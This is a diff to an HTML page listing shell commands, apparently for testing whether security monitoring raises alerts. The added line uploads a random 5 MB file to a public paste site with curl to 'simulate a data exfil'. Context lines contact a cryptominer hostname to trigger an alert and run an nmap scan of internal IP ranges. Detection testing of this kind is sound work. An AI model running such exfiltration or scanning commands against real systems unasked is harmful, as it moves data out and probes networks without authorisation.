@@ -101,6 +101,7 @@
           <!--<li>$ curl github.com/somebadfile</li>-->
           <li>$ curl https://donate.v2.xmrig.com (trigger critical known-bad external hostname alert)</li>
           <li>$ curl ifconfig.me (this will print your remote address)</li>
+          <li>$ dd if=/dev/urandom of=/tmp/test.5mb bs=1024 count=5000 && curl --upload-file /tmp/test.5mb https://paste.c-net.org/ (simulate a data exfil)</li>
           <li>$ hostname</li>
           <li>$ nmap -Pn -sT [cidr from <b>Internal IP info</b>] # no ping (scan all hosts), do full tcp connect instead of SYN only</li>
         </ul>
